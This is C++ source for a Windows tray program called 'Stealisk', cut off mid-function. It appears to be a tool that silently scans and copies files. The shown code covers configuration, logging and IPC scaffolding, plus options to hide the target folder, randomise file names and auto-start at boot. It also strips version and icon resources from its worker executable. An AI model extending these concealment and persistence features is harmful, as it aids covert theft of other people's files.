// Stealisk.cpp
// 三进程架构：Controller + Console + Worker
// 编译：使用 compile.bat

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <eh.h>
#include <exception>
#include <shlobj.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <dbt.h>
#include <psapi.h>
#include <sstream>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <algorithm>
#include <cctype>
#include <iostream>
#include <shellapi.h>
#include <wincrypt.h>
#include <atomic>
#include <conio.h>
#include <memory>
#include "resource.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "ole32.lib")

// ==================== 常量定义 ====================
namespace StealiskConstants {
    constexpr size_t AES_KEY_HEX_LEN = 64;
    constexpr size_t MAX_CONFIG_FILE_SIZE = 1024 * 1024;
    constexpr size_t MAX_INI_VALUE_LEN = 16384;
    constexpr size_t FILE_HASH_BUFFER_SIZE = 8192;
    constexpr size_t MAX_PID_READ_SIZE = 32;
    constexpr int WORKER_STOP_WAIT_TIMEOUT_MS = 10000;
    constexpr int WORKER_STOP_RETRY_COUNT = 3;
    constexpr int WORKER_STOP_RETRY_INTERVAL_MS = 200;
    constexpr int CONSOLE_EXIT_WAIT_MS = 3000;
    constexpr int CONSOLE_CHECK_INTERVAL_MS = 500;
    constexpr const wchar_t* DEFAULT_CACHE_DIR = L"cache";
    constexpr const wchar_t* DEFAULT_WORKER = L"Stealisk_worker.exe";
}

// ==================== 窗口消息定义 ====================
#define WM_TRAYICON (WM_USER + 100)
#define WM_USER_SCAN (WM_USER + 2)
#define WM_USER_STOP_SCAN (WM_USER + 3)
#define WM_SHOW_CONSOLE (WM_USER + 4)
#define WM_USER_UPDATE_STATUS (WM_USER + 5)

#define ID_TRAY_TOGGLE_SERVICE 1001
#define ID_TRAY_MANUAL_SCAN 1002
#define ID_TRAY_EDIT_CONFIG 1003
#define ID_TRAY_SHOW_CONSOLE 1004
#define ID_TRAY_EXIT 1005

// ==================== 进程间通信命令 ====================
enum ConsoleCommandType {
    CMD_NONE = 0,
    CMD_SCAN,
    CMD_STOP_SCAN,
    CMD_STATUS,
    CMD_CONFIG_CHANGED,
    CMD_UPDATE_MENU,
    CMD_SHOW,
    CMD_HIDE,
    CMD_EXIT,
    CMD_TOGGLE_SERVICE,
    CMD_EDIT_CONFIG,
    CMD_CONSOLE_READY,
    CMD_TOGGLE_VISIBLE,
    CMD_VISIBILITY_CHANGED,
};

struct ConsoleCommand {
    ConsoleCommandType type;
    char data[256];
};

#define WM_USER_COMMAND (WM_USER + 10)

// ==================== UTF-8 ↔ UTF-16 转换 ====================
static std::wstring Utf8ToWide(const std::string& utf8) {
    if (utf8.empty()) return L"";
    int len = MultiByteToWideChar(CP_UTF8, 0, utf8.c_str(), -1, NULL, 0);
    if (len <= 0) {
        len = MultiByteToWideChar(CP_ACP, 0, utf8.c_str(), -1, NULL, 0);
        if (len <= 0) return L"";
        std::vector<wchar_t> wbuf(len);
        MultiByteToWideChar(CP_ACP, 0, utf8.c_str(), -1, wbuf.data(), len);
        return std::wstring(wbuf.data(), len - 1);
    }
    std::vector<wchar_t> wbuf(len);
    MultiByteToWideChar(CP_UTF8, 0, utf8.c_str(), -1, wbuf.data(), len);
    return std::wstring(wbuf.data(), len - 1);
}

static std::string WideToUtf8(const std::wstring& wide) {
    if (wide.empty()) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), -1, NULL, 0, NULL, NULL);
    if (len <= 0) return "";
    std::vector<char> buf(len);
    WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), -1, buf.data(), len, NULL, NULL);
    return std::string(buf.data(), len - 1);
}

// ==================== RAII 句柄包装器 ====================
class FileHandle {
    HANDLE m_handle;
public:
    FileHandle(HANDLE handle = INVALID_HANDLE_VALUE) : m_handle(handle) {}
    ~FileHandle() { reset(); }

    FileHandle(FileHandle&& other) noexcept : m_handle(other.m_handle) {
        other.m_handle = INVALID_HANDLE_VALUE;
    }
    FileHandle& operator=(FileHandle&& other) noexcept {
        if (this != &other) {
            reset();
            m_handle = other.m_handle;
            other.m_handle = INVALID_HANDLE_VALUE;
        }
        return *this;
    }
    FileHandle(const FileHandle&) = delete;
    FileHandle& operator=(const FileHandle&) = delete;

    void reset(HANDLE handle = INVALID_HANDLE_VALUE) {
        if (m_handle != INVALID_HANDLE_VALUE) {
            CloseHandle(m_handle);
            m_handle = INVALID_HANDLE_VALUE;
        }
        if (handle != INVALID_HANDLE_VALUE) m_handle = handle;
    }

    HANDLE get() const { return m_handle; }
    operator HANDLE() const { return m_handle; }
    bool valid() const { return m_handle != INVALID_HANDLE_VALUE; }
    HANDLE* ptr() { return &m_handle; }
};

class RegKeyHandle {
    HKEY m_handle;
public:
    RegKeyHandle(HKEY handle = NULL) : m_handle(handle) {}
    ~RegKeyHandle() { reset(); }

    RegKeyHandle(RegKeyHandle&& other) noexcept : m_handle(other.m_handle) {
        other.m_handle = NULL;
    }
    RegKeyHandle& operator=(RegKeyHandle&& other) noexcept {
        if (this != &other) {
            reset();
            m_handle = other.m_handle;
            other.m_handle = NULL;
        }
        return *this;
    }
    RegKeyHandle(const RegKeyHandle&) = delete;
    RegKeyHandle& operator=(const RegKeyHandle&) = delete;

    void reset(HKEY handle = NULL) {
        if (m_handle != NULL) {
            RegCloseKey(m_handle);
            m_handle = NULL;
        }
        if (handle != NULL) m_handle = handle;
    }

    HKEY get() const { return m_handle; }
    operator HKEY() const { return m_handle; }
    bool valid() const { return m_handle != NULL; }
    HKEY* ptr() { return &m_handle; }
};

// ==================== 路径辅助 ====================
static std::wstring GetExeDirectory() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    PathRemoveFileSpecW(exePath);
    return std::wstring(exePath);
}

static std::wstring ExpandEnvironmentStringsInPath(const std::wstring& path) {
    if (path.empty()) return path;
    if (path.find(L'%') == std::wstring::npos) return path;
    DWORD size = ExpandEnvironmentStringsW(path.c_str(), NULL, 0);
    if (size == 0) return path;
    std::vector<wchar_t> buffer(size);
    if (ExpandEnvironmentStringsW(path.c_str(), buffer.data(), size) == 0) return path;
    return std::wstring(buffer.data());
}

// ==================== 全局错误模式 ====================
static void SetGlobalErrorMode() {
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
}

// ==================== 日志（UTF-8 BOM） ====================
static std::wstring g_cachedCacheDir;

static void WriteLog(const std::string& msg, bool debug = false) {
    try {
        std::wstring cacheDir = g_cachedCacheDir.empty() ?
            GetExeDirectory() + L"\\" + StealiskConstants::DEFAULT_CACHE_DIR :
            g_cachedCacheDir;
        wchar_t logPath[MAX_PATH];
        wcscpy_s(logPath, cacheDir.c_str());
        PathAppendW(logPath, debug ? L"Stealisk_debug.log" : L"Stealisk.log");

        FileHandle hFile(CreateFileW(logPath, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
        if (!hFile.valid()) return;

        if (GetFileSize(hFile, NULL) == 0) {
            BYTE bom[] = {0xEF, 0xBB, 0xBF};
            DWORD written;
            WriteFile(hFile, bom, 3, &written, NULL);
        }

        SYSTEMTIME st;
        GetLocalTime(&st);
        char timeBuf[64];
        sprintf_s(timeBuf, "%04d-%02d-%02d %02d:%02d:%02d ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        DWORD written;
        WriteFile(hFile, timeBuf, strlen(timeBuf), &written, NULL);
        WriteFile(hFile, msg.c_str(), msg.length(), &written, NULL);
        WriteFile(hFile, "\r\n", 2, &written, NULL);
    } catch (...) {}
}

// ==================== 资源提取 ====================
static bool ExtractResourceToFile(LPCWSTR lpName, LPCWSTR lpType, LPCWSTR outputPath) {
    HRSRC hRes = FindResourceW(NULL, lpName, lpType);
    if (!hRes) return false;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;
    DWORD dataSize = SizeofResource(NULL, hRes);
    void* pData = LockResource(hData);
    if (!pData) return false;

    wchar_t dir[MAX_PATH];
    wcscpy_s(dir, outputPath);
    PathRemoveFileSpecW(dir);
    if (!PathFileExistsW(dir)) {
        SHCreateDirectoryExW(NULL, dir, NULL);
    }

    FileHandle hFile(CreateFileW(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
    if (!hFile.valid()) return false;

    DWORD written;
    BOOL ok = WriteFile(hFile, pData, dataSize, &written, NULL);
    return ok && (written == dataSize);
}

static bool ExtractDefaultConfig() {
    std::wstring configPath = GetExeDirectory() + L"\\Stealisk.ini";
    if (PathFileExistsW(configPath.c_str())) return true;
    return ExtractResourceToFile(MAKEINTRESOURCEW(1), RT_RCDATA, configPath.c_str());
}

// ==================== PID 文件 ====================
static std::wstring GetPidFilePath() {
    std::wstring cacheDir = g_cachedCacheDir.empty() ?
        GetExeDirectory() + L"\\" + StealiskConstants::DEFAULT_CACHE_DIR :
        g_cachedCacheDir;
    return cacheDir + L"\\Stealisk.pid";
}

static void WritePidFile(DWORD pid) {
    std::wstring path = GetPidFilePath();
    FileHandle hFile(CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
    if (!hFile.valid()) return;
    std::string content = std::to_string(pid);
    DWORD written;
    WriteFile(hFile, content.c_str(), content.size(), &written, NULL);
}

static DWORD ReadPidFile() {
    std::wstring path = GetPidFilePath();
    FileHandle hFile(CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL));
    if (!hFile.valid()) return 0;
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > StealiskConstants::MAX_PID_READ_SIZE) return 0;
    std::vector<char> buffer(fileSize + 1, 0);
    DWORD bytesRead;
    ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL);
    std::string content(buffer.data(), bytesRead);
    try { return std::stoul(content); }
    catch (...) { return 0; }
}

static void DeletePidFile() {
    std::wstring path = GetPidFilePath();
    DeleteFileW(path.c_str());
}

// ==================== 配置管理 ====================
static std::string ReadFileToString(const wchar_t* path) {
    FileHandle hFile(CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL));
    if (!hFile.valid()) return "";
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > StealiskConstants::MAX_CONFIG_FILE_SIZE) return "";
    std::vector<char> buffer(fileSize + 1, 0);
    DWORD bytesRead;
    ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL);
    return std::string(buffer.data(), bytesRead);
}

static std::map<std::string, std::string> ParseIniToMap(const std::string& content) {
    std::map<std::string, std::string> result;
    try {
        std::istringstream iss(content);
        std::string line, section;
        while (std::getline(iss, line)) {
            size_t start = line.find_first_not_of(" \t\r\n");
            if (start == std::string::npos) continue;
            line = line.substr(start);
            size_t end = line.find_last_not_of(" \t\r\n");
            if (end != std::string::npos) line = line.substr(0, end + 1);
            if (line.empty()) continue;
            if (line.front() == '[' && line.back() == ']') {
                section = line.substr(1, line.length() - 2);
                continue;
            }
            size_t eq = line.find('=');
            if (eq != std::string::npos) {
                std::string key = line.substr(0, eq);
                std::string value = line.substr(eq + 1);
                key.erase(0, key.find_first_not_of(" \t\r\n"));
                key.erase(key.find_last_not_of(" \t\r\n") + 1);
                value.erase(0, value.find_first_not_of(" \t\r\n"));
                value.erase(value.find_last_not_of(" \t\r\n") + 1);
                if (!section.empty()) {
                    result[section + "." + key] = value;
                } else {
                    result[key] = value;
                }
            }
        }
    } catch (...) {
        WriteLog("ParseIniToMap exception", true);
    }
    return result;
}

static std::map<std::string, std::string> LoadDefaultConfigMap() {
    HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(1), RT_RCDATA);
    if (!hRes) return {};
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return {};
    DWORD size = SizeofResource(NULL, hRes);
    char* data = (char*)LockResource(hData);
    if (!data) return {};
    std::string defaultIni(data, size);
    return ParseIniToMap(defaultIni);
}

// 写入配置文件，effective 为有效键值对（默认+用户有效覆盖），userFull 为用户原始完整配置（用于注释废弃键）
static void WriteIniFile(const wchar_t* path,
                         const std::map<std::string, std::string>& effective,
                         const std::map<std::string, std::string>& userFull) {
    try {
        wchar_t tempPath[MAX_PATH];
        wcscpy_s(tempPath, path);
        wcscat_s(tempPath, L".tmp");

        FileHandle hFile(CreateFileW(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
        if (!hFile.valid()) {
            WriteLog("WriteIniFile: Cannot create temp file", true);
            return;
        }

        std::set<std::string> effectiveKeys;
        for (const auto& [k, v] : effective) {
            effectiveKeys.insert(k);
        }

        std::map<std::string, std::map<std::string, std::string>> effectiveSections;
        for (const auto& [fullKey, value] : effective) {
            size_t dot = fullKey.find('.');
            if (dot != std::string::npos) {
                std::string section = fullKey.substr(0, dot);
                std::string key = fullKey.substr(dot + 1);
                effectiveSections[section][key] = value;
            }
        }

        std::map<std::string, std::map<std::string, std::string>> userSections;
        for (const auto& [fullKey, value] : userFull) {
            size_t dot = fullKey.find('.');
            if (dot != std::string::npos) {
                std::string section = fullKey.substr(0, dot);
                std::string key = fullKey.substr(dot + 1);
                userSections[section][key] = value;
            } else {
                userSections[""][fullKey] = value;
            }
        }

        std::set<std::string> allSections;
        for (const auto& [s, _] : effectiveSections) allSections.insert(s);
        for (const auto& [s, _] : userSections) allSections.insert(s);

        auto WriteLine = [&](const std::string& line) -> bool {
            DWORD written;
            return WriteFile(hFile, line.c_str(), line.length(), &written, NULL) && written == line.length();
        };

        for (const std::string& section : allSections) {
            if (section.empty()) continue;
            std::string line = "[" + section + "]\n";
            if (!WriteLine(line)) { return; }

            if (effectiveSections.count(section)) {
                for (const auto& [key, value] : effectiveSections[section]) {
                    line = key + " = " + value + "\n";
                    if (!WriteLine(line)) { return; }
                }
            }

            if (userSections.count(section)) {
                for (const auto& [key, value] : userSections[section]) {
                    std::string fullKey = section + "." + key;
                    if (effectiveKeys.find(fullKey) == effectiveKeys.end()) {
                        line = "; " + key + " = " + value + "\n";
                        if (!WriteLine(line)) { return; }
                    }
                }
            }

            if (!WriteLine("\n")) { return; }
        }

        if (userSections.count("") && !userSections[""].empty()) {
            for (const auto& [key, value] : userSections[""]) {
                if (effectiveKeys.find(key) == effectiveKeys.end()) {
                    std::string line = "; " + key + " = " + value + "\n";
                    if (!WriteLine(line)) { return; }
                }
            }
        }

        hFile.reset();
        DeleteFileW(path);
        if (!MoveFileW(tempPath, path)) {
            WriteLog("WriteIniFile: MoveFile failed", true);
            DeleteFileW(tempPath);
        }
    } catch (const std::exception& e) {
        WriteLog("WriteIniFile exception: " + std::string(e.what()), true);
    } catch (...) {
        WriteLog("WriteIniFile unknown exception", true);
    }
}

namespace ConfigKeys {
    constexpr const char* SECTION_FILTER      = "Filter";
    constexpr const char* SECTION_OPTIONS     = "Options";
    constexpr const char* SECTION_ENCRYPTION  = "Encryption";

    constexpr const char* EXCLUDE_DIRS        = "exclude_dirs";
    constexpr const char* EXCLUDE_FILES       = "exclude_files";
    constexpr const char* INCLUDE_DIRS        = "include_dirs";
    constexpr const char* INCLUDE_FILES       = "include_files";
    constexpr const char* CASE_SENSITIVE      = "case_sensitive";

    constexpr const char* AUTO_COPY           = "auto_copy";
    constexpr const char* SHOW_TRAY           = "show_tray";
    constexpr const char* ENABLE_ENCRYPT      = "enable_encrypt";
    constexpr const char* AUTO_START_BOOT     = "auto_start_boot";
    constexpr const char* AUTO_START_SERVICE  = "auto_start_service";
    constexpr const char* RANDOMIZE_FILENAME  = "randomize_filename";
    constexpr const char* SCAN_DELAY_SECONDS  = "scan_delay_seconds";
    constexpr const char* SCAN_INTERVAL_SECONDS = "scan_interval_seconds";
    constexpr const char* TARGET_DIR          = "target_dir";
    constexpr const char* WORKER              = "worker";
    constexpr const char* CACHE_DIR           = "cache_dir";
    constexpr const char* STRIP_RESOURCES     = "strip_resources";
    constexpr const char* LANGUAGE            = "language";
    constexpr const char* ENCRYPT_KEY         = "key";
    constexpr const char* HIDE_TARGET_DIR     = "hide_target_dir";
}

struct Config {
    std::map<std::string, std::string> raw;
    static std::map<std::string, std::string> defaultRaw;

    template<typename T>
    T GetValue(const std::string& section, const std::string& key) const;

    template<typename T>
    T ParseValue(const std::string& val) const;

    std::vector<std::wstring> ParseWideList(const std::string& val) const {
        std::vector<std::wstring> result;
        std::stringstream ss(val);
        std::string item;
        while (std::getline(ss, item, ',')) {
            size_t start = item.find_first_not_of(" \t");
            if (start != std::string::npos) {
                item = item.substr(start);
                size_t end = item.find_last_not_of(" \t");
                if (end != std::string::npos) item = item.substr(0, end + 1);
            }
            if (!item.empty()) {
                result.push_back(Utf8ToWide(item));
            }
        }
        return result;
    }

    std::vector<std::wstring> GetExcludeDirs() const {
        return ParseWideList(GetValue<std::string>(ConfigKeys::SECTION_FILTER, ConfigKeys::EXCLUDE_DIRS));
    }
    std::vector<std::wstring> GetExcludeFiles() const {
        return ParseWideList(GetValue<std::string>(ConfigKeys::SECTION_FILTER, ConfigKeys::EXCLUDE_FILES));
    }
    std::vector<std::wstring> GetIncludeDirs() const {
        return ParseWideList(GetValue<std::string>(ConfigKeys::SECTION_FILTER, ConfigKeys::INCLUDE_DIRS));
    }
    std::vector<std::wstring> GetIncludeFiles() const {
        return ParseWideList(GetValue<std::string>(ConfigKeys::SECTION_FILTER, ConfigKeys::INCLUDE_FILES));
    }

    bool GetCaseSensitive()    const { return GetValue<bool>(ConfigKeys::SECTION_FILTER, ConfigKeys::CASE_SENSITIVE); }
    bool GetAutoCopy()         const { return GetValue<bool>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::AUTO_COPY); }
    bool GetShowTray()         const { return GetValue<bool>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::SHOW_TRAY); }
    bool GetEnableEncrypt()    const { return GetValue<bool>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::ENABLE_ENCRYPT); }
    bool GetAutoStartBoot()    const { return GetValue<bool>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::AUTO_START_BOOT); }
    bool GetAutoStartService() const { return GetValue<bool>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::AUTO_START_SERVICE); }
    bool GetRandomizeFilename()const { return GetValue<bool>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::RANDOMIZE_FILENAME); }
    bool GetHideTargetDir()    const { return GetValue<bool>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::HIDE_TARGET_DIR); }
    bool GetStripResources()   const { return GetValue<bool>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::STRIP_RESOURCES); }
    int  GetScanDelaySeconds() const { return GetValue<int>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::SCAN_DELAY_SECONDS); }
    int  GetScanIntervalSeconds()const{ return GetValue<int>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::SCAN_INTERVAL_SECONDS); }
    std::wstring GetTargetDir() const { return GetValue<std::wstring>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::TARGET_DIR); }
    std::wstring GetWorker()    const { return GetValue<std::wstring>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::WORKER); }
    std::wstring GetCacheDir()  const { return GetValue<std::wstring>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::CACHE_DIR); }
    std::string GetLanguage()   const { return GetValue<std::string>(ConfigKeys::SECTION_OPTIONS, ConfigKeys::LANGUAGE); }
    std::string GetEncKeyHex()  const { return GetValue<std::string>(ConfigKeys::SECTION_ENCRYPTION, ConfigKeys::ENCRYPT_KEY); }
};

template<typename T>
T Config::GetValue(const std::string& section, const std::string& key) const {
    std::string fullKey = section + "." + key;
    auto it = raw.find(fullKey);
    if (it != raw.end()) {
        return ParseValue<T>(it->second);
    }
    auto dit = defaultRaw.find(fullKey);
    if (dit != defaultRaw.end()) {
        return ParseValue<T>(dit->second);
    }
    return ParseValue<T>("");
}

template<>
inline std::string Config::ParseValue<std::string>(const std::string& val) const {
    return val;
}

template<>
inline bool Config::ParseValue<bool>(const std::string& val) const {
    return val == "true" || val == "1" || val == "yes";
}

template<>
inline int Config::ParseValue<int>(const std::string& val) const {
    try { return std::stoi(val); }
    catch (...) { return 0; }
}

template<>
inline std::wstring Config::ParseValue<std::wstring>(const std::string& val) const {
    return Utf8ToWide(val);
}

std::map<std::string, std::string> Config::defaultRaw = LoadDefaultConfigMap();

// ==================== 缓存目录 ====================
static void InitCacheDirectory(const Config& cfg) {
    std::wstring configured = cfg.GetCacheDir();
    if (!configured.empty()) {
        std::wstring expanded = ExpandEnvironmentStringsInPath(configured);
        if (PathIsRelativeW(expanded.c_str())) {
            expanded = GetExeDirectory() + L"\\" + expanded;
        }
        g_cachedCacheDir = expanded;
    } else {
        g_cachedCacheDir = GetExeDirectory() + L"\\" + StealiskConstants::DEFAULT_CACHE_DIR;
    }
    CreateDirectoryW(g_cachedCacheDir.c_str(), NULL);
    WriteLog("Cache directory: " + WideToUtf8(g_cachedCacheDir), true);
}

static std::wstring GetCacheDirectory() {
    return g_cachedCacheDir;
}

// ==================== Worker 路径 ====================
static std::wstring g_cachedWorkerPath;

static std::wstring GetWorkerPath(const Config& cfg) {
    if (!g_cachedWorkerPath.empty()) {
        return g_cachedWorkerPath;
    }

    std::wstring worker = cfg.GetWorker();

    if (worker.empty()) {
        worker = StealiskConstants::DEFAULT_WORKER;
        WriteLog("Using default worker: " + WideToUtf8(worker), true);
    }

    worker = ExpandEnvironmentStringsInPath(worker);

    bool isAbsolute = (worker.length() >= 2 && worker[1] == L':') ||
                      (worker.length() >= 1 && worker[0] == L'\\') ||
                      (worker.length() >= 2 && worker[0] == L'\\' && worker[1] == L'\\');

    if (!isAbsolute) {
        std::wstring exeDir = GetExeDirectory();
        worker = exeDir + L"\\" + worker;
        wchar_t normalized[MAX_PATH];
        if (PathCanonicalizeW(normalized, worker.c_str())) {
            worker = normalized;
        }
        WriteLog("Resolved relative worker path: " + WideToUtf8(worker), true);
    } else {
        WriteLog("Using absolute worker path: " + WideToUtf8(worker), true);
    }

    if (worker.length() < 4 || worker.substr(worker.length() - 4) != L".exe") {
        worker += L".exe";
        WriteLog("Auto-appended .exe to worker path", true);
    }

    wchar_t selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);
    if (_wcsicmp(worker.c_str(), selfPath) == 0) {
        std::wstring selfName = selfPath;
        size_t dot = selfName.find_last_of(L'.');
        if (dot != std::wstring::npos) {
            selfName = selfName.substr(0, dot);
        }
        std::wstring safeName = selfName + L"_worker.exe";
        WriteLog("WARNING: worker conflicts with main executable! Using: " + WideToUtf8(safeName), true);
        worker = safeName;
    }

    g_cachedWorkerPath = worker;
    WriteLog("Final worker path: " + WideToUtf8(worker), true);
    return worker;
}

// ==================== 资源剥离 ====================
static BOOL CALLBACK DeleteResourceByLang(HMODULE hModule, LPCWSTR lpszType, LPCWSTR lpszName,
                                          WORD wLang, LONG_PTR lParam) {
    HANDLE hUpdate = (HANDLE)lParam;
    if (UpdateResourceW(hUpdate, lpszType, lpszName, wLang, NULL, 0)) {
        WriteLog("StripWorkerResources: Deleted resource", true);
    } else {
        WriteLog("StripWorkerResources: Failed to delete resource, error=" + std::to_string(GetLastError()), true);
    }
    return TRUE;
}

static BOOL CALLBACK EnumResourceNamesCallback(HMODULE hModule, LPCWSTR lpszType, LPWSTR lpszName,
                                                LONG_PTR lParam) {
    HANDLE hUpdate = (HANDLE)lParam;
    EnumResourceLanguagesW(hModule, lpszType, lpszName, DeleteResourceByLang, lParam);
    return TRUE;
}

static void StripWorkerResources(const std::wstring& workerPath) {
    HANDLE hUpdate = BeginUpdateResourceW(workerPath.c_str(), FALSE);
    if (!hUpdate) {
        WriteLog("StripWorkerResources: BeginUpdateResourceW failed", true);
        return;
    }

    HMODULE hMod = LoadLibraryExW(workerPath.c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (!hMod) {
        WriteLog("StripWorkerResources: LoadLibraryEx failed", true);
        EndUpdateResourceW(hUpdate, TRUE);
        return;
    }

    if (!EnumResourceNamesW(hMod, RT_VERSION, (ENUMRESNAMEPROCW)EnumResourceNamesCallback, (LONG_PTR)hUpdate)) {
        WriteLog("StripWorkerResources: EnumResourceNamesW(RT_VERSION) failed", true);
    }
    if (!EnumResourceNamesW(hMod, RT_GROUP_ICON, (ENUMRESNAMEPROCW)EnumResourceNamesCallback, (LONG_PTR)hUpdate)) {
        WriteLog("StripWorkerResources: EnumResourceNamesW(RT_GROUP_ICON) failed", true);
    }

    FreeLibrary(hMod);
    if (!EndUpdateResourceW(hUpdate, FALSE)) {
        WriteLog("StripWorkerResources: EndUpdateResourceW failed", true);
    } else {
        WriteLog("StripWorkerResources: Successfully stripped resources", true);
    }
}

// ==================== 配置加载 ====================
static Config LoadConfig() {
    std::wstring configPath = GetExeDirectory() + L"\\Stealisk.ini";
    Config cfg;

    try {
        if (Config::defaultRaw.empty()) {
            WriteLog("Warning: default config empty, reloading from resource", true);
            Config::defaultRaw = LoadDefaultConfigMap();
            if (Config::defaultRaw.empty()) {
                WriteLog("FATAL: Failed to load default config from resource!", true);
                exit(1);
            }
        }

        std::map<std::string, std::string> diskMap;
        std::string diskContent = ReadFileToString(configPath.c_str());
        if (!diskContent.empty()) {
            diskMap = ParseIniToMap(diskContent);
        }

        std::map<std::string, std::string> cleanedDiskMap;
        for (const auto& [key, value] : diskMap) {
            if (Config::defaultRaw.find(key) != Config::defaultRaw.end()) {
                cleanedDiskMap[key] = value;
            } else {
                WriteLog("INFO: Unknown config key will be commented: " + key, true);
            }
        }

        cfg.raw = Config::defaultRaw;
        for (const auto& [key, value] : cleanedDiskMap) {
            cfg.raw[key] = value;
        }

        WriteIniFile(configPath.c_str(), cfg.raw, diskMap);

        InitCacheDirectory(cfg);
        GetWorkerPath(cfg);

        auto includeFiles = cfg.GetIncludeFiles();
        auto excludeFiles = cfg.GetExcludeFiles();
        auto includeDirs = cfg.GetIncludeDirs();
        auto excludeDirs = cfg.GetExcludeDirs();

        if (!includeFiles.empty()) {
            for (const auto& f : includeFiles) WriteLog("Include file: " + WideToUtf8(f), true);
        } else {
            WriteLog("Include file: (none - all files allowed)", true);
        }
        if (!excludeFiles.empty()) {
            for (const auto& f : excludeFiles) WriteLog("Exclude file: " + WideToUtf8(f), true);
        } else {
            WriteLog("Exclude file: (none)", true);
        }
        if (!includeDirs.empty()) {
            for (const auto& d : includeDirs) WriteLog("Include dir: " + WideToUtf8(d), true);
        } else {
            WriteLog("Include dir: (none - all dirs allowed)", true);
        }
        if (!excludeDirs.empty()) {
            for (const auto& d : excludeDirs) WriteLog("Exclude dir: " + WideToUtf8(d), true);
        } else {
            WriteLog("Exclude dir: (none)", true);
        }

    } catch (const std::exception& e) {
        WriteLog("LoadConfig exception: " + std::string(e.what()), true);
    } catch (...) {
        WriteLog("LoadConfig unknown exception", true);
    }

    return cfg;
}

// ==================== 语言管理 ====================
struct Language {
    std::map<std::string, std::string> strings;
    std::string appName;
};

static Language g_lang;

static bool LoadLanguageFromResource(const std::string& langCode, Language& lang) {
    std::wstring wcode = Utf8ToWide(langCode);
    HRSRC hRes = FindResourceW(NULL, wcode.c_str(), RT_RCDATA);
    if (!hRes) return false;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return false;
    DWORD size = SizeofResource(NULL, hRes);
    char* data = (char*)LockResource(hData);
    if (!data) return false;
    std::string content(data, size);
    std::istringstream iss(content);
    std::string line;
    while (std::getline(iss, line)) {
        if (line.empty() || line[0] == '[') continue;
        size_t eq = line.find('=');
        if (eq != std::string::npos) {
            std::string key = line.substr(0, eq);
            std::string value = line.substr(eq + 1);
            key.erase(0, key.find_first_not_of(" \t\r\n"));
            key.erase(key.find_last_not_of(" \t\r\n") + 1);
            value.erase(0, value.find_first_not_of(" \t\r\n"));
            value.erase(value.find_last_not_of(" \t\r\n") + 1);
            lang.strings[key] = value;
            if (key == "app_name") lang.appName = value;
        }
    }
    return true;
}

static BOOL CALLBACK EnumResourceNamesProc(HMODULE hModule, LPCWSTR lpszType, LPWSTR lpszName, LONG_PTR lParam) {
    auto* vec = reinterpret_cast<std::vector<std::string>*>(lParam);
    if (!IS_INTRESOURCE(lpszName)) {
        std::wstring wname(lpszName);
        vec->push_back(WideToUtf8(wname));
    }
    return TRUE;
}

static std::vector<std::string> EnumerateAvailableLanguages() {
    std::vector<std::string> langs;
    EnumResourceNamesW(NULL, RT_RCDATA, EnumResourceNamesProc, (LONG_PTR)&langs);
    return langs;
}

static std::string GetLangString(const Language& lang, const std::string& key, const std::map<std::string, std::string>& vars = {}) {
    try {
        std::string result = lang.strings.count(key) ? lang.strings.at(key) : key;
        for (const auto& [k, v] : vars) {
            std::string placeholder = "{" + k + "}";
            size_t pos = 0;
            while ((pos = result.find(placeholder, pos)) != std::string::npos) {
                result.replace(pos, placeholder.length(), v);
                pos += v.length();
            }
        }
        return result;
    } catch (...) {
        return key;
    }
}

static Language InitLanguage(const Config& cfg) {
    auto langs = EnumerateAvailableLanguages();
    if (langs.empty()) return Language();
    Language lang;
    std::string langCode = cfg.GetLanguage();
    if (!langCode.empty() && LoadLanguageFromResource(langCode, lang)) {
